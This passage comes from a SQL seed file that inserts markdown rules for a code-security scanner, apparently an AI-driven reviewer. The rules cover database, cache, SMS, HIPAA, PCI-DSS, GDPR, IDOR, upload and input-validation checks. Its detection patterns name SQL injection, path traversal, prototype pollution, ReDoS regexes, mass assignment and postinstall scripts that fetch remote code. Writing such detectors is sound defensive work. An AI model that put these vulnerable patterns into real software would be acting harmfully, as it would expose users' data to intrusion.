- `pages/api/*mail*`, `app/api/*mail*`
- `lib/email*.ts`, `.env*`
', 'high', NULL, NULL, '**/email*.ts, **/send*.ts, **/mail*.ts, pages/api/*mail*, app/api/*mail*, lib/email*.ts, .env*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-17', 'snitch-default-v1', 'Database Security (Prisma, Drizzle, Raw Connections)', '## CATEGORY 17: Database Security (Prisma, Drizzle, Raw Connections)

### Detection
- `@prisma/client`, `drizzle-orm`, `pg`, `mysql2` imports
- `DATABASE_URL`, `POSTGRES_URL` environment variables

### What to Search For
- Connection strings in client code
- Raw SQL with user input
- Missing query safety measures

### Critical
- `DATABASE_URL` with credentials in client-side code
- Connection strings in `NEXT_PUBLIC_*` variables
- `$queryRaw` or `$executeRaw` with string interpolation (SQL injection)
- Template literals with `${userInput}` in raw SQL

### High
- Prisma `$queryRawUnsafe` usage with any user input
- Raw SQL queries built with string concatenation
- Missing connection pooling for serverless (no PgBouncer/Prisma Accelerate)

### Medium
- Prisma schema with `@db.VarChar` without explicit length limits
- No query timeouts configured
- Database errors exposed to users without sanitization

### Context Check
1. Is the raw SQL using parameterized placeholders or string interpolation?
2. Does user input actually flow into the query, or is it hardcoded/server-generated?
3. Is the database connection server-only or potentially exposed to client code?
4. Is there an ORM layer handling escaping automatically?

### NOT Vulnerable
- `DATABASE_URL` in server-only code
- Parameterized queries with `Prisma.sql` template tag
- ORM queries (Prisma/Drizzle) with proper escaping
- Raw queries with only hardcoded values

### Files to Check
- `prisma/schema.prisma`, `drizzle.config.ts`
- `**/db*.ts`, `lib/prisma.ts`, `lib/db.ts`
- `.env*`
', 'critical', NULL, NULL, 'prisma/schema.prisma, drizzle.config.ts, **/db*.ts, lib/prisma.ts, lib/db.ts, .env*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-18', 'snitch-default-v1', 'Redis/Cache Security (Upstash, Redis)', '## CATEGORY 18: Redis/Cache Security (Upstash, Redis)

### Detection
- `@upstash/redis`, `ioredis`, `redis` imports
- `REDIS_URL`, `UPSTASH_REDIS_REST_URL` environment variables

### What to Search For
- Redis credentials in client code
- Unencrypted sensitive data in cache
- Missing authentication

### Critical
- `UPSTASH_REDIS_REST_TOKEN` in client-side code
- `REDIS_URL` with password in frontend
- Redis connection strings in `NEXT_PUBLIC_*` variables

### High
- No authentication on Redis commands (open Redis instance)
- Storing sensitive data (tokens, PII) without encryption
- Cache keys predictable from user input (cache poisoning)

### Medium
- No TTL on cached sensitive data
- Serializing full objects with sensitive fields

### Context Check
1. Is Redis/cache used server-side only or accessible from client code?
2. Is the cached data sensitive (tokens, PII) or public/non-sensitive?
3. Are cache keys unpredictable or derived from user input?
4. Is there a TTL set on sensitive cached data?

### NOT Vulnerable
- Redis credentials in server-only code
- Encrypted values in cache
- Public/non-sensitive data cached without encryption

### Files to Check
- `**/redis*.ts`, `**/cache*.ts`
- `lib/redis.ts`, `lib/cache.ts`
- `.env*`
', 'high', NULL, NULL, '**/redis*.ts, **/cache*.ts, lib/redis.ts, lib/cache.ts, .env*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-19', 'snitch-default-v1', 'SMS/Communication Security (Twilio)', '## CATEGORY 19: SMS/Communication Security (Twilio)

### Detection
- `twilio` imports
- `TWILIO_ACCOUNT_SID`, `TWILIO_AUTH_TOKEN` environment variables

### What to Search For
- Auth tokens in client code
- User-controlled phone numbers
- Missing webhook verification

### Critical
- `TWILIO_AUTH_TOKEN` in client-side code
- Account SID + Auth Token in frontend files

### High
- User-controlled phone numbers without validation (SMS pumping attack)
- No rate limiting on SMS endpoints
- Missing webhook signature validation (`validateRequest`)

### Medium
- Phone numbers logged without masking
- No verification of phone number ownership before sending

### Context Check
1. Is the SMS endpoint server-only and rate-limited?
2. Are phone numbers validated and verified before sending?
3. Is webhook signature validation applied to incoming Twilio requests?
4. Are phone numbers masked in logs?

### NOT Vulnerable
- Twilio credentials in server-only code
- Properly validated phone numbers with ownership verification
- Rate-limited SMS endpoints

### Files to Check
- `**/twilio*.ts`, `**/sms*.ts`
- `pages/api/*sms*`, `app/api/*sms*`
- `.env*`
', 'high', NULL, NULL, '**/twilio*.ts, **/sms*.ts, pages/api/*sms*, app/api/*sms*, .env*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-20', 'snitch-default-v1', 'HIPAA (Healthcare Information Portability and Accountability Act)', '## CATEGORY 20: HIPAA (Healthcare Information Portability and Accountability Act)

### Detection
- Health-related data models: `patient`, `medical`, `diagnosis`, `prescription`, `treatment`
- Healthcare terms in schemas, APIs, or variables: `PHI`, `ePHI`, `clinical`, `healthcare`
- Medical identifiers: `mrn`, `medical_record`, `insurance_id`, `health_plan`, `provider_npi`

### What to Search For
- PHI logged to console or logging systems
- Unencrypted health data storage
- Missing audit trails on health endpoints
- PHI exposed in URLs or query parameters
- Health data in error messages

### Critical
- `console.log`, `logger.*` with patient data, diagnosis, prescription, or medical records
- Health data stored without `encrypt`, `cipher`, or `aes` protection
- Patient IDs or MRNs in URL path segments or query parameters
- Patient data leaked in catch blocks or error responses

### High
- Health endpoints without audit log decorators or middleware
- HTTP (non-HTTPS) endpoints handling health data
- Health data endpoints without role-based access control checks
- No data retention/deletion patterns for health records

### Context Check
1. Is this in test code or production code?
2. Is the data actually PHI (protected health information)?
3. Is there encryption or audit logging applied elsewhere in the stack?
4. Does the application actually handle healthcare data?

### NOT Vulnerable
- Health-related variable names in test files with mock data
- Encrypted PHI with proper key management
- Audit-logged health endpoints with RBAC
- Development/staging environments with synthetic data

### Files to Check
- `**/patient*.ts`, `**/medical*.ts`, `**/health*.ts`
- `**/ehr/**`, `**/clinical/**`
- API routes handling health data
- Database schemas with health-related tables
', 'critical', NULL, NULL, '**/patient*.ts, **/medical*.ts, **/health*.ts, **/ehr/**, **/clinical/**, API routes handling health data, Database schemas with health-related tables', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-21', 'snitch-default-v1', 'SOC 2 (Trust Service Criteria)', '## CATEGORY 21: SOC 2 (Trust Service Criteria)

> **Cross-reference:** SOC 2 overlaps with Category 4 (Authentication), Category 12 (Logging/Data Exposure), and Categories 1/2/10 (Input validation). Deduplicate findings — if an issue is already reported under those categories, reference it here rather than reporting twice.

### Detection
- Authentication systems, session management
- Audit logging infrastructure
- Access control patterns
- Change management logs

### What to Search For
- Missing access/audit logs on sensitive routes
- Weak password policies
- Missing MFA on admin routes
- Session management without timeouts
- Input validation gaps
- Missing error handling

### Critical
- Auth/sensitive routes without any audit logging (CC6.1 violation)
- Admin routes without `mfa`, `2fa`, or `totp` verification
- Sessions without `maxAge`, `expires`, or timeout configuration

### High
- Password validation accepting < 8 characters or no complexity requirements
- User input directly used without `sanitize`, `validate`, or `escape` (CC6.6 violation)
- Async operations without try/catch or global error handlers (CC7.2 violation)
- PII stored without encryption functions
- Data mutations without changelog or audit entries (CC6.2 violation)

### Context Check
1. Is audit logging handled at infrastructure level (middleware)?
2. Is MFA enforced at the auth provider level (Clerk, Auth0)?
3. Are there compensating controls not visible in application code?
4. Is this a public-facing or internal application?

### NOT Vulnerable
- Routes with audit middleware applied at router level
- Password validation with proper complexity (8+ chars, mixed case, numbers, symbols)
- MFA handled by auth provider (Clerk, Auth0, Okta)
- Input sanitization applied via validation library (Zod, Yup, Joi)
- Centralized error handling in framework configuration

### Files to Check
- `middleware.ts`, authentication handlers
- Password validation schemas
- Session configuration files
- Error handling middleware
- Audit logging utilities
', 'high', NULL, NULL, 'middleware.ts, authentication handlers, Password validation schemas, Session configuration files, Error handling middleware, Audit logging utilities', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-22', 'snitch-default-v1', 'PCI-DSS (Payment Card Industry Data Security Standard)', '## CATEGORY 22: PCI-DSS (Payment Card Industry Data Security Standard)

> **Cross-reference:** PCI-DSS overlaps with Category 13 (Stripe Security) for payment processing. If Stripe/Braintree findings are already reported under Category 13, reference them here rather than reporting twice. Focus this category on raw card handling, TLS configuration, and card data storage.

### Detection
- Payment processing: `card_number`, `credit_card`, `pan`, `payment`
- Card security codes: `cvv`, `cvc`, `security_code`
- Payment processor integrations: Stripe, Braintree, Square

### What to Search For
- Card numbers in logs (Req 3.2)
- Full PAN storage without tokenization (Req 3.4)
- CVV/CVC stored anywhere (Req 3.2 - never store)
- Card data in URLs (Req 4.1)
- Weak TLS configuration (Req 4.1)
- Direct card handling instead of payment processor tokens

### Critical
- Logging statements capturing card number patterns `\d{13,19}`
- Variables storing full card numbers without tokenization
- Any storage or variable containing `cvv`, `cvc`, or `security_code` values
- Card numbers in query params or URL path segments
- `TLS 1.0`, `TLS 1.1`, `SSLv3`, or weak cipher configurations
- Encryption keys hardcoded in source or config files

### High
- Raw card processing logic instead of Stripe/Braintree tokenization
- `card_number`, `pan` variables that aren''t tokenized references
- Storing full card + expiry + cardholder name when not business-required

### Context Check
1. Is this actual card data or tokenized references (`pm_`, `tok_` prefixes)?
2. Is the card number regex for validation (not storage)?
3. Is this test code with test card numbers?
4. Does the application use a PCI-compliant payment processor?

### NOT Vulnerable (False Positives)
- Stripe payment method tokens (`pm_*`) or token objects (`tok_*`)
- Card number validation regex (format checking, not storing)
- Test card numbers in test files (`4242424242424242`)
- Last 4 digits only storage (`card_last4`, `last_four`)
- Masked card display (`****1234`)
- Payment processor SDK usage without raw card handling

### Files to Check
- `**/payment*.ts`, `**/checkout*.ts`, `**/billing*.ts`
- `**/stripe*.ts`, `**/braintree*.ts`
- Logging configuration files
- TLS/SSL configuration
- `.env*` for encryption keys
', 'critical', NULL, NULL, '**/payment*.ts, **/checkout*.ts, **/billing*.ts, **/stripe*.ts, **/braintree*.ts, Logging configuration files, TLS/SSL configuration, .env* for encryption keys', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-23', 'snitch-default-v1', 'GDPR (General Data Protection Regulation)', '## CATEGORY 23: GDPR (General Data Protection Regulation)

### Detection
- Personal data handling: `personal_data`, `pii`, `data_subject`
- Consent management: `consent`, `opt_in`, `gdpr`
- Data subject rights: `right_to_delete`, `right_to_access`, `data_export`
- EU user detection: locale, region, or country checks for EU

### What to Search For
- Data collection without consent verification
- Missing data deletion endpoints
- Missing data export/portability endpoints
- Excessive data collection
- No data retention policies
- Third-party data sharing without consent
- Analytics/tracking without consent checks

### Critical
- Personal data collection without `consent`, `opt_in`, or `agreed` verification (Art 6)
- No data deletion capability for personal data (Art 17 - Right to Erasure). Search broadly for ANY of these patterns:
  - Route/endpoint names: `delete`, `remove`, `erase`, `purge`, `destroy`, `forget`, `wipe`, `clear`
  - Function names: `deleteUser`, `removeAccount`, `eraseUser`, `forgetMe`, `purgeData`, `destroyAccount`, `closeAccount`, `deactivateAccount`
  - Combined with: `user`, `account`, `profile`, `data`, `personal`, `member`, `customer`
  - API paths: `/delete`, `/remove`, `/erase`, `/account/close`, `/me/delete`, `/privacy/delete`
  - If ANY deletion mechanism exists (regardless of naming), it satisfies Art 17
- No data export/portability capability (Art 20 - Right to Data Portability). Search broadly for ANY of these patterns:
  - Route/endpoint names: `export`, `download`, `portability`, `extract`, `dump`, `backup`, `archive`
  - Function names: `exportData`, `downloadData`, `getUserData`, `getMyData`, `extractData`, `generateReport`, `downloadProfile`
  - Combined with: `user`, `account`, `profile`, `data`, `personal`, `member`, `customer`
  - API paths: `/export`, `/download`, `/me/data`, `/privacy/export`, `/account/data`
  - File generation: `csv`, `json`, `pdf`, `zip` exports of user data
  - If ANY export mechanism exists (regardless of naming), it satisfies Art 20
- EU user data sent to non-EU endpoints without transfer safeguards (Art 44-49)

### High
- Collecting unnecessary fields (SSN, DOB when not business-required) (Art 5)
- Personal data without `ttl`, `expiresAt`, or cleanup jobs (Art 5)
- PII sent to external APIs without consent verification (Art 44)
- Analytics or tracking initialized without consent banner check (Art 7)
- Missing incident response or breach notification patterns (Art 33)

### Medium
- No `anonymize`, `pseudonymize`, or `hash` functions for analytics data (Art 25)
- Cookie consent not verified before setting non-essential cookies

### Context Check
1. Does the application actually handle EU user data?
2. Is consent managed at a different layer (consent management platform)?
3. Are there data processing agreements with third parties?
4. Is this personal data or anonymous/aggregated data?

### NOT Vulnerable
- Consent verification before data collection
- Any working data deletion mechanism, regardless of naming convention
- Any working data export/download mechanism, regardless of naming convention
- Anonymized or pseudonymized data for analytics
- Proper data retention with automated cleanup
- Consent management platform integration
- Third-party services with DPAs in place

### Files to Check
- User registration and data collection endpoints
- Privacy/settings pages
- Account management pages (settings, profile, close account)
- Analytics initialization code
- Data export/deletion handlers (search broadly: `delete`, `remove`, `export`, `download`, `extract`, etc.)
- Cookie consent components
- Third-party integrations sending user data
- Admin panels with user management features
', 'high', NULL, NULL, 'User registration and data collection endpoints, Privacy/settings pages, Account management pages (settings, profile, close account), Analytics initialization code, Data export/deletion handlers (search broadly: delete, remove, export, download, extract, etc.), Cookie consent components, Third-party integrations sending user data, Admin panels with user management features', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-24', 'snitch-default-v1', 'Memory Leaks', '## CATEGORY 24: Memory Leaks

### Detection
- Frontend frameworks: React, Vue, Angular, Svelte with lifecycle hooks
- Event-driven patterns: `addEventListener`, `.on()`, `.subscribe()`
- Timer functions: `setInterval`, `setTimeout`
- Connection patterns: WebSocket, database connections, streams

### What to Search For
- `addEventListener` without corresponding `removeEventListener` in cleanup
- `useEffect` with timers or listeners but no cleanup return function
- `setInterval`/`setTimeout` without clearing in cleanup
- Module-scope `Map`/`Set` that grow without eviction or size limits
- WebSocket/stream/connection opened without corresponding close
- `.on()`/`.subscribe()` without `.off()`/`.unsubscribe()` in cleanup

### Actually Vulnerable
- Event listeners added in component mount without removal on unmount
- `useEffect` creating intervals/subscriptions with no cleanup return
- Module-level caches (`Map`, `Set`, `Object`) that grow unbounded
- Database connections opened per-request without pooling or closing
- WebSocket connections without close handlers

### NOT Vulnerable
- Event listeners with proper cleanup in `useEffect` return or `componentWillUnmount`
- `setInterval` with matching `clearInterval` in cleanup
- Caches with TTL, LRU eviction, or size limits
- Connection pools (e.g., Prisma client singleton)
- One-time static listeners (e.g., `process.on(''uncaughtException'')`)

### Context Check
1. Is there a cleanup function that removes the listener/timer?
2. Is this a module-level singleton (acceptable) or per-request allocation?
3. Does the cache have eviction or size limits?
4. Is the connection pooled or per-request?

### Files to Check
- `**/components/**/*.tsx`, `**/hooks/**/*.ts`
- `**/lib/**/*.ts`, `**/utils/**/*.ts`
- `**/services/**/*.ts`, `**/workers/**/*.ts`
', 'medium', NULL, NULL, '**/components/**/*.tsx, **/hooks/**/*.ts, **/lib/**/*.ts, **/utils/**/*.ts, **/services/**/*.ts, **/workers/**/*.ts', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-25', 'snitch-default-v1', 'N+1 Queries', '## CATEGORY 25: N+1 Queries

### Detection
- ORM usage: `@prisma/client`, `drizzle-orm`, `typeorm`, `sequelize`, `mongoose`
- Database queries inside loops or array iteration methods
- GraphQL resolvers with per-field data fetching

### What to Search For
- ORM `findUnique`/`findFirst`/`findOne` inside `for`/`forEach`/`map` loops
- `await` database calls inside loop bodies
- GraphQL field resolvers making individual database queries without DataLoader
- Missing `include`/`select`/`populate` for relations accessed after initial query
- `fetch()` per-item in loops in server-side code

### Actually Vulnerable
- `prisma.user.findUnique()` called inside a `for` loop iterating over IDs
- `await db.query()` inside `array.map()` or `forEach()`
- GraphQL resolver fetching related records one-by-one without batching
- Fetching a list then looping to fetch each item''s relations separately
- Sequential API calls per-item when a batch endpoint exists

### NOT Vulnerable
- Single queries with `include`/`select` loading relations eagerly
- Batch operations: `findMany`, `WHERE IN`, `Promise.all` with batch fetch
- GraphQL resolvers using DataLoader for batching
- Loop queries where the loop is bounded to a small known size (< 5)
- Client-side fetching in user-triggered handlers (not render loops)

### Context Check
1. Is the database call actually inside a loop or iteration?
2. Could this be replaced with a single query using `include`, `WHERE IN`, or batch fetch?
3. Is the loop bounded to a small constant or potentially unbounded?
4. Is this server-side code (performance impact) or client-side (less concern)?

### Files to Check
- `**/api/**/*.ts`, `**/routes/**/*.ts`
- `**/services/**/*.ts`, `**/resolvers/**/*.ts`
- `**/actions/**/*.ts`, `**/server/**/*.ts`
- GraphQL resolver files
', 'medium', NULL, NULL, '**/api/**/*.ts, **/routes/**/*.ts, **/services/**/*.ts, **/resolvers/**/*.ts, **/actions/**/*.ts, **/server/**/*.ts, GraphQL resolver files', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-26', 'snitch-default-v1', 'Performance Problems', '## CATEGORY 26: Performance Problems

### Detection
- Synchronous file system operations in request handlers
- Database queries without indexes or limits
- Full library imports in client bundles
- Missing pagination on list endpoints
- Sequential independent async operations

### What to Search For
- `fs.readFileSync`/`writeFileSync` in request handlers (not config/build scripts)
- Prisma schema fields used in `where`/`orderBy` without `@@index`
- `findMany({})`/`.find({})` without `take`/`limit` clause
- `import _ from ''lodash''` (full library) in client-side code
- List/search endpoints without pagination parameters (`skip`, `take`, `page`, `limit`)
- Sequential independent `await` calls that should be `Promise.all`
- Inline object/array literals in JSX props of mapped components (causes re-renders)

### Actually Vulnerable
- `fs.readFileSync` inside an API route handler or middleware
- Database query on a frequently-filtered field with no index defined
- `findMany({})` returning entire table with no limit
- Full lodash import (`import _ from ''lodash''`) in a client-side bundle
- API endpoint returning all records with no pagination
- Three sequential `await` calls to independent services (should be parallel)

### NOT Vulnerable
- `readFileSync` in config loading at startup or build scripts
- Queries on primary keys or already-indexed fields
- `findMany` with explicit `take`/`limit` clause
- Tree-shakeable imports (`import { debounce } from ''lodash/debounce''`)
- Endpoints with cursor/offset pagination
- Sequential awaits where each depends on the previous result

### Context Check
1. Is the sync file operation in a request handler or at startup/build time?
2. Is the unindexed field actually used in production queries?
3. Is the unbounded query on a table that will remain small or could grow large?
4. Are the sequential awaits actually independent or do they depend on each other?

### Files to Check
- `**/api/**/*.ts`, `**/routes/**/*.ts`, `**/middleware/**/*.ts`
- `prisma/schema.prisma` (check `@@index` directives)
- `**/components/**/*.tsx` (check imports and JSX props)
- `**/pages/**/*.tsx`, `**/app/**/*.tsx`
', 'medium', NULL, NULL, '**/api/**/*.ts, **/routes/**/*.ts, **/middleware/**/*.ts, prisma/schema.prisma (check @@index directives), **/components/**/*.tsx (check imports and JSX props), **/pages/**/*.tsx, **/app/**/*.tsx', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-27', 'snitch-default-v1', 'Dependency Vulnerabilities / Supply Chain', '## CATEGORY 27: Dependency Vulnerabilities / Supply Chain

### Detection
- Package manifests: `package.json`, `requirements.txt`, `Gemfile`, `go.mod`
- Lock files: `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
- CI/CD dependency installation steps

### Active Audit Step (REQUIRED)
Run the appropriate audit command for the project''s package manager. This gives authoritative CVE data — do not skip it:

```
npm audit --json          # npm
pnpm audit --json         # pnpm
yarn audit --json         # Yarn 1.x
pip-audit                 # Python
bundle audit              # Ruby
govulncheck ./...         # Go
```

Parse the output and report:
- **Critical/High severity advisories** — flag immediately, include CVE ID and affected version range
- **Moderate severity** — flag if the package is in `dependencies` (production)
- **Low severity in devDependencies** — note but mark as lower priority

### What to Search For
- Missing lockfile entirely (non-deterministic installs)
- `postinstall` scripts in dependencies doing suspicious things (network calls, file writes outside package)
- Typosquatting indicators (packages with names very similar to popular ones)
- Pinned to very old major versions of security-critical packages (e.g., `express` v3, `jsonwebtoken` v7)
- Dependencies with known CVEs in the locked version
- `npm audit` / `yarn audit` equivalent checks not present in CI
- Recently-disclosed 0-days in commonly-used packages — pay particular attention to:
  - React / react-dom (XSS issues in certain render paths)
  - Next.js (path traversal, SSRF, and auth bypass CVEs in older versions)
  - Express (prototype pollution, RegEx DoS in old versions)
  - `jsonwebtoken` (algorithm confusion, none-algorithm bypass in v8 and below)
  - `lodash` (prototype pollution — CVE-2019-10744 and related)
  - `node-fetch` / `axios` (SSRF and header injection in older versions)
  - `multer` / `formidable` (path traversal in older versions)
  - Any package pinned to a version released more than 2 major versions ago

### Actually Vulnerable
- No lockfile committed (anyone running install gets potentially different versions)
- Dependency with a `postinstall` script that downloads and executes remote code
- Package name one character off from a popular package (potential typosquat)
- Security-critical package pinned to end-of-life major version
- Known CVE in locked dependency version with no override or resolution
- `npm audit` returns Critical or High advisories for production dependencies
- Package version falls within a known vulnerable range for a disclosed CVE

### NOT Vulnerable
- Lock file present and committed
- `postinstall` scripts that run standard build steps (tsc, node-gyp)
- Well-known packages from verified publishers
- Packages on current or recent major versions
- Vulnerabilities only in devDependencies not shipped to production
- `npm audit` returns zero Critical/High findings

### Context Check
1. Is the lockfile committed to the repository?
2. Are suspicious postinstall scripts from trusted, well-known packages?
3. Is the outdated package a dev-only dependency or shipped to production?
4. Does the project have automated dependency auditing in CI?
5. Does `npm audit` show any Critical or High advisories? Report the CVE ID and affected package.

### Files to Check
- `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
- `.github/workflows/*.yml` (check for audit steps)
- `.npmrc`, `.yarnrc.yml` (registry configuration)
', 'high', NULL, NULL, 'package.json, package-lock.json, yarn.lock, pnpm-lock.yaml, .github/workflows/*.yml (check for audit steps), .npmrc, .yarnrc.yml (registry configuration)', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-28', 'snitch-default-v1', 'Authorization & Access Control (IDOR)', '## CATEGORY 28: Authorization & Access Control (IDOR)

### Detection
- API routes accepting resource IDs as parameters
- Database queries using user-supplied IDs
- Role/permission systems and middleware
- Admin routes and privileged operations

### What to Search For
- API routes that take resource IDs but don''t verify ownership
- Missing role/permission checks on admin routes
- Sequential/predictable IDs used for resource access without auth checks
- `findUnique({ where: { id } })` without ownership filter (e.g., no `userId` in where clause)
- Missing authorization middleware (distinct from authentication)
- ORM mass assignment: `prisma.*.update({ data: req.body })` or `Model.create(req.body)` without explicit field picking

### Actually Vulnerable
- `GET /api/users/:id` returning any user''s data without checking if requester owns that resource
- `DELETE /api/posts/:id` without verifying the post belongs to the authenticated user
- Admin route (`/api/admin/*`) with no role check middleware
- `prisma.order.findUnique({ where: { id: params.id } })` without `userId` filter
- Endpoints using sequential integer IDs with no authorization check
- `prisma.user.update({ where: { id }, data: req.body })` — attacker can set `isAdmin: true`, `role: "admin"`, etc.
- `User.create(req.body)` or `.update(req.body)` in any ORM without allow-listing specific fields

### NOT Vulnerable
- Routes with ownership verification (`where: { id, userId: session.userId }`)
- Admin routes protected by role-checking middleware
- Public resources intentionally accessible to all (e.g., published blog posts)
- Routes using proper ownership verification (e.g., `where: { id, userId: session.userId }`) — UUID vs integer ID does NOT matter; ownership check is what counts
- Resources scoped by tenant/organization with middleware enforcement
- Explicit field destructuring before ORM call: `const { name, email } = req.body` then using only those fields
- Using a Zod/Yup/Joi schema that strips unknown fields before the ORM call

### Context Check
1. Does the route verify the authenticated user owns or has access to the requested resource?
2. Is there authorization middleware applied at the router level?
3. Are these intentionally public endpoints?
4. Is there a tenant/org scoping mechanism in place?
5. Are IDs UUIDs? Note: UUID format alone does NOT prevent IDOR. Ownership verification is still required.

### Files to Check
- `**/api/**/*.ts`, `**/routes/**/*.ts`
- `**/middleware/**/*.ts`
- `**/actions/**/*.ts`, `**/server/**/*.ts`
- `**/controllers/**/*.ts`
', 'high', NULL, NULL, '**/api/**/*.ts, **/routes/**/*.ts, **/middleware/**/*.ts, **/actions/**/*.ts, **/server/**/*.ts, **/controllers/**/*.ts', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-29', 'snitch-default-v1', 'File Upload Security', '## CATEGORY 29: File Upload Security

### Detection
- File upload libraries: `multer`, `formidable`, `busboy`, `@uploadthing/*`
- File handling: `multipart/form-data`, file write operations
- Storage patterns: local file storage, S3 uploads, cloud storage

### What to Search For
- File uploads accepting any file type (no extension or MIME type validation)
- User-controlled filenames used directly in file paths (path traversal via `../../`)
- Uploads stored in publicly accessible directories (e.g., `public/uploads/`)
- Missing file size limits on upload endpoints
- No virus/malware scanning on uploaded files
- File type checked only by extension, not by magic bytes/file signature

### Actually Vulnerable
- Upload handler with no file type restriction (`multer()` with no `fileFilter`)
- `path.join(uploadDir, req.file.originalname)` using user-supplied filename directly
- Files saved to `public/uploads/` accessible via direct URL
- No `limits` configuration on multer/formidable (unlimited file size)
- Extension-only validation (`.jpg`) without checking actual file content

### NOT Vulnerable
- File type validation checking both extension and MIME type
- Filenames replaced with generated UUIDs/hashes
- Files stored in private storage (S3 with signed URLs, not public directory)
- File size limits configured on upload middleware
- Upload middleware with proper `fileFilter` configuration

### Context Check
1. Is the filename sanitized or replaced before storage?
2. Is there file type validation beyond just extension?
3. Are uploaded files stored in a private or public location?
4. Are file size limits configured?

### Files to Check
- `**/upload/**/*.ts`, `**/file/**/*.ts`
- `**/api/**/*.ts` (routes handling multipart)
- Multer/formidable configuration files
- Storage utility files
', 'high', NULL, NULL, '**/upload/**/*.ts, **/file/**/*.ts, **/api/**/*.ts (routes handling multipart), Multer/formidable configuration files, Storage utility files', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-30', 'snitch-default-v1', 'Input Validation & ReDoS', '## CATEGORY 30: Input Validation & ReDoS

### Detection
- File system operations with user input
- Object merge/assign patterns with external data
- Regular expressions in validation or parsing
- Request body handling configuration
- Template literals with dynamic content

### What to Search For
- Path traversal: `../` in user input passed to file system operations (`fs.readFile`, `path.join`)
- Prototype pollution: `__proto__`, `constructor.prototype` in object merge/spread/assign
- ReDoS: Regex with nested quantifiers (e.g., `(a+)+`, `(a|a)*`, `(.*a){x}`)
- Missing request body size limits on Express/Fastify
- `Object.assign` or spread with untrusted input without property filtering
- Template literal injection in non-SQL contexts (log forging, header injection)

### Actually Vulnerable
- `fs.readFile(path.join(baseDir, req.query.file))` without sanitizing `../` sequences
- `Object.assign(config, req.body)` allowing `__proto__` pollution
- Regex like `/^(a+)+$/` used to validate user input (catastrophic backtracking)
- Express app with no `express.json({ limit: ''...'' })` body size configuration
- `lodash.merge(defaults, userInput)` with unsanitized user input

### NOT Vulnerable
- File paths validated against an allowlist or using `path.resolve` with base dir check
- Object merge with explicit property picking (`{ name, email } = req.body`)
- Simple regex without nested quantifiers
- Body parser with explicit size limits configured
- Input validated through schema validation (Zod, Joi, Yup)

### Context Check
1. Does user input flow into file system operations?
2. Is object merging done with explicit property selection or raw input?
3. Does the regex have nested quantifiers that could cause backtracking?
4. Is there a body size limit configured on the HTTP framework?

### Files to Check
- `**/api/**/*.ts`, `**/routes/**/*.ts`
- `**/middleware/**/*.ts`, `**/server*.ts`
- `**/validation/**/*.ts`, `**/utils/**/*.ts`
- Express/Fastify app configuration files
', 'high', NULL, NULL, '**/api/**/*.ts, **/routes/**/*.ts, **/middleware/**/*.ts, **/server*.ts, **/validation/**/*.ts, **/utils/**/*.ts, Express/Fastify app configuration files', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');
INSERT INTO rules (id, rulesetId, title, description, severity, language, framework, filePattern, pattern, goodExample, badExample, createdAt, updatedAt) VALUES ('snitch-cat-31', 'snitch-default-v1', 'CI/CD Pipeline Security', '## CATEGORY 31: CI/CD Pipeline Security

### Detection
- GitHub Actions: `.github/workflows/*.yml`
- GitLab CI: `.gitlab-ci.yml`
